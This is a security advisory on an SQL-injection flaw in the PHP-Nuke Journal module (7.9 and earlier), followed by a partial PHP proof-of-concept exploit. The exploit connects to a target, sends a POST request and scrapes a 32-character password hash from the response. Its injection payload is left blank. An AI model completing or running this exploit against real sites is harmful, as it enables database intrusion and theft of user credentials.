source: http://www.securityfocus.com/bid/20829/info

The PHP-Nuke Journal module is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.

PHP-Nuke 7.9 and prior versions are vulnerable.

<?
/*

Neo Security Team - Pseudo-Code Proof of Concept Exploit
http://www.neosecurityteam.net
Paisterist

*/
set_time_limit(0);
$host="localhost";
$path="/phpnuke/";
$port="80";
$fp = fsockopen($host, $port, $errno, $errstr, 30);
$data=""; /* Here the variables, like "bywhat" and "forwhat", with the 
SQL Injection */

if ($fp) {
    /* we put the POST request on $p variable, sending the data saved on 
$data. */

    fwrite($fp, $p);

    while (!feof($fp)) {
        $content .= fread($fp, 4096);
    }

    preg_match("/([a-zA-Z0-9]{32})/", $content, $matches);

    if ($matches[0])
    print "<b>Hash: </b>".$matches[0];
}
?>